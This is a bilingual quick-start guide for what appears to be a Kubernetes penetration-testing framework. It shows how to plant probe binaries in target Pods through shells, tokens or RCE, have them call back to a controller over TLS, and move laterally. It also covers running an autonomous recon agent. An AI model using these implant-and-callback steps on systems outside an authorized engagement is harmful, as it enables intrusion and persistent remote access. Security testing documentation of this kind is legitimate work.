# 快速开始 / Quick start

接入顺序是：安装并启动 → 浏览器登录 → 接入已有探针或立足点 → 通过探针通道投放与横向 → `agent run`。默认立足点是一个普通的最低权限 Pod（非 root、没有 hostPath 或 privileged、没有 kubeconfig，只有出站 TCP）；kubeconfig 不是前置条件。

## 1. 安装并启动

```bash
pip install inkblade && inkblade up --no-consent
```

从源码检出安装：

```bash
bash scripts/install.sh
```

```powershell
powershell -ExecutionPolicy Bypass -File scripts\install.ps1
```

容器：

```bash
docker build -t inkblade:latest .
docker run --rm -it -p 127.0.0.1:8765:8765 -v inkblade-data:/data \
  inkblade:latest --home /data up --host 0.0.0.0 --foreground --no-browser --no-consent
```

`up` 做四件事：

1. 自检：Python 版本、工作区可写、磁盘余量、端口可用。
2. 创建工作区：默认 `./inkblade-workspace`，`--home` 可改。
3. 生成 `admin` 随机密码，只打印一次；`users.json` 只存 scrypt 哈希。
4. 启动本地控制台 `127.0.0.1:8765`，并尝试打开浏览器。

`--no-consent` 表示不预签任何范围，授权由登录后显式完成。重复执行是幂等的：不重建工作区、不重印密码、不重复启动进程。

## 2. 浏览器登录

打开 `127.0.0.1:8765`，用 `admin` 和首次启动打印的密码登录。首次投放前在控制台签署授权记录，或执行：

```bash
inkblade quickstart
```

记录绑定目标、范围、级别、时间窗与应急联系人；`inkblade roe` 查看当前授权状态。

## 3. 接入已有探针

默认立足点是一个普通的最低权限 Pod：非 root、没有 hostPath 或 privileged、没有 kubeconfig，只有出站 TCP。探针主动回连控制端，Pod 不用开监听端口。

```bash
inkblade channel listen \
  --bind 0.0.0.0 --port 9443 \
  --transport tls \
  --token-file ./probe.token \
  --workspace local-lab
```

`channel listen` 首次运行会生成 `ca.pem`、`server.pem`、`server-key.pem` 与叶证书的 SHA-256 pin，并输出探针命令。按你的投放方式把 `ca.pem` 与 token 文件送进 Pod（token 不要写进明文日志），在 Pod 内让探针回连：

```bash
./inkblade-probe reverse \
  --transport tls \
  --host <controller> --port 9443 \
  --ca-file ca.pem --pin <sha256> --sni <name> \
  --token-file /tmp/probe.token \
  --probe-id pod-a
```

`tls` 是默认传输；也可以选 `--transport wss --path /ws` 或 `--transport https`，三者都是加密传输，承载同一个 framed RPC。`probe list` 列出已登记的探针（`probe_id`、父探针、传输、状态、目标）。子探针由父探针用 `probe upload` + `probe spawn` 投放，回连方式相同。目标环境里已有本地命令通道时，也可以用 stdio 通道（`inkblade channel start --session <session-id>`）；默认路径不依赖它。通道只在本地回环暴露 SOCKS5 与端口转发，用于访问目标 Pod 网络内的服务。

## 4. 首次投放（不需要 kubeconfig）

### 4.1 已有立足点：foothold

默认场景是普通 Pod：非 root、没有 hostPath 或 privileged、没有 kubeconfig，只有出站 TCP。用已有的 shell、ServiceAccount token 或授权 RCE 投放第一颗探针：

```bash
inkblade session open \
  --mode foothold \
  --target <target> \
  --credential-source pod-shell \
  --namespace <namespace> \
  --pod <pod>

inkblade probe deploy \
  --session <session-id> \
  --via rce \
  --binary ./inkblade-probe-linux-amd64 \
  --probe-token-file ./probe.token \
  --allow-write
```

随后在 Pod 内启动探针回连：

```bash
./inkblade-probe reverse \
  --transport tls \
  --host <controller> --port 9443 \
  --ca-file ca.pem --pin <sha256> --sni <name> \
  --token-file /tmp/probe.token \
  --probe-id pod-a
```

- `--credential-source` 可取 `pod-shell`、`sa-token` 或 `rce`。
- `--via rce` 适合低权限 Pod：通过授权代码执行入口把探针放到可写临时目录或 memfd；`--via sa-token` 使用已有 ServiceAccount token。
- 投放后 `probe list` 里会出现新的 `probe_id`；用 `probe collect` 拉取快照，确认真实权限与挂载。

### 4.2 外部入口：external

只有可达服务、没有 shell 时，先用有界证明建立会话：

```bash
inkblade session open \
  --mode external \
  --target <target> \
  --proof @proof.json

inkblade probe deploy \
  --session <session-id> \
  --via rce \
  --binary ./inkblade-probe-linux-amd64 \
  --probe-token-file ./probe.token \
  --allow-write
```

`external` 只做有界可达性与版本/路由证明；取得授权 RCE 之前只允许只读侦察。拿到 RCE 后，探针经该入口投放，随后回连控制端。

## 5. 三种入口

| 入口 | 适用场景 | kubeconfig |
|---|---|---|
| `foothold` | 默认：最低权限 Pod（非 root、没有 hostPath 或 privileged、只有出站 TCP），已有 shell、SA token 或 RCE | 不需要 |
| `external` | 目标可达，先提交有界证明，再经 RCE 或回调投放 | 不需要 |
| `kubeconfig` | 可选的首次批量 bootstrap，一次给多个 Pod 投放 | 可选 |

## 6. 自主检测与报告

```bash
inkblade agent run \
  --probe <probe-id> \
  --objective read-only-recon \
  --workspace ./work \
  --budget-steps 40

inkblade report --run <run-id> --lang bi
inkblade export --run <run-id> --format sarif
```

`agent run` 打印 `run_id`；`report` 渲染双语渗透报告与修复清单；`export` 输出 SARIF、OCSF 或 VEX。运行中可以用 `agent status`、`agent trace` 查看，`agent stop` 急停。

## 7. 可选：kubeconfig 批量投放

持有运维 kubeconfig、需要一次 bootstrap 多个 Pod 时：

```bash
inkblade session open \
  --mode kubeconfig \
  --kubeconfig ~/.kube/config \
  --namespace <namespace> \
  --pod <pod>

inkblade probe deploy \
  --session <session-id> \
  --via kubectl \
  --binary ./inkblade-probe-linux-amd64 \
  --allow-write
```

这是高级路径，不是快速开始的前置步骤；首批探针就绪后，后续动作同样走探针通道。

## 8. 日常命令与参数

```bash
inkblade up        # 启动控制台（幂等）
inkblade status    # 进程、授权、用户、证据
inkblade down      # 停止控制台（幂等）
```

| Flag | 作用 |
|---|---|
| `--home <dir>` | 工作区目录（默认 `./inkblade-workspace`） |
| `--port <n>` | 本地控制台端口（默认 `8765`） |
| `--host <addr>` | 绑定地址（默认 `127.0.0.1`；容器内用 `0.0.0.0`） |
| `--no-browser` | 不自动打开浏览器 |
| `--no-ui` | 只初始化工作区，不启动控制台 |
| `--foreground` | 前台运行（容器/systemd） |
| `--no-consent` | 不预签任何范围，由登录后显式签署 |

## 9. 下一步

- 安装方式、离线与 Helm：[`INSTALL.md`](INSTALL.md)
- 完整命令与工作流：[`USAGE.md`](USAGE.md)
- 检测分层与产出：[`DETECTION-LAYERS.md`](DETECTION-LAYERS.md)
- 常见问题：[`FAQ.md`](FAQ.md)
- 文档总索引：[`DOC-INDEX.md`](DOC-INDEX.md)

## English

Probe-first onboarding: install and start, sign in, attach the probe or foothold you already hold, then deliver and move laterally through the probe channel. The default foothold is an ordinary least-privilege Pod — non-root, no hostPath or privileged mode, no kubeconfig, outbound TCP only. A kubeconfig is optional.

```bash
pip install inkblade && inkblade up --no-consent
```

Open `127.0.0.1:8765`, sign in as `admin` with the one-time password, and sign the authorization record with `inkblade quickstart` or in the console.

Existing probe: the controller listens and the probe connects back.

```bash
inkblade channel listen \
  --bind 0.0.0.0 --port 9443 \
  --transport tls \
  --token-file ./probe.token \
  --workspace local-lab
# in the Pod (copy ca.pem and the token through your authorized foothold):
./inkblade-probe reverse \
  --transport tls \
  --host <controller> --port 9443 \
  --ca-file ca.pem --pin <sha256> --sni <name> \
  --token-file /tmp/probe.token \
  --probe-id pod-a
inkblade probe list
```

First delivery from a least-privilege foothold (no kubeconfig):

```bash
inkblade session open --mode foothold --target <target> \
  --credential-source pod-shell --namespace <namespace> --pod <pod>
inkblade probe deploy --session <session-id> --via rce \
  --binary ./inkblade-probe-linux-amd64 \
  --probe-token-file ./probe.token --allow-write
./inkblade-probe reverse \
  --transport tls \
  --host <controller> --port 9443 \
  --ca-file ca.pem --pin <sha256> --sni <name> \
  --token-file /tmp/probe.token \
  --probe-id pod-a
```

A child probe is delivered from the parent with `probe upload` + `probe spawn` and calls back the same way. A stdio channel (`channel start --session <id>`) is available when a local command transport exists.

`external` starts from a bounded reachability proof and then uses an authorized RCE or callback you already control to place the probe. `kubeconfig` remains an optional batch bootstrap for several Pods. Once the first probe is ready, `agent run --probe <probe-id> --objective read-only-recon` and `report --run <run-id>` complete the flow.
